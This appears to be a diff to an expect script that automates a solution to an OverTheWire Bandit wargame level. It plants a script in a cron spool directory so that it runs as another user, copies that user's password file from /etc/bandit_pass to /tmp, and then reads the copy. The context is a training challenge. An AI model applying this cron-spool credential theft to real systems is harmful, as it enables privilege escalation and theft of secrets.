@@ -11,17 +11,18 @@ expect "*\$ "
 send "cat /usr/bin/cronjob_bandit24.sh\r"
 expect "*\$ "
 
-# send "echo I am user bandit23 | md5sum | cut -d ' ' -f 1\r"
-# expect "*\$ "
+send "echo \"cat /etc/bandit_pass/bandit24 > /tmp/exfil\" > /var/spool/bandit24/exploit.sh\r"
+expect "*\$ "
 
-send "cat << EOF > /var/spool/bandit24/exploit.sh\r"
-send "#!/bin/bash\r"
-send "cat /etc/bandit_pass/bandit24 > /tmp/exfil.txt\r"
-send "EOF\r"
+send "chmod +x /var/spool/bandit24/exploit.sh\r"
+expect "*\$ "
 
-send "chmod u+x /var/spool/bandit24/exploit.sh\r"
+sleep 60
 
-# send "cat /tmp/8ca319486bfbbc3663ea0fbe81326349\r"
-# expect "*\$ "
+send "cat /tmp/exfil\r"
+expect "*\$ "
 
-interact
+send "rm -f /tmp/exfil\r"
+expect "*\$ "
+
+send "exit\r"
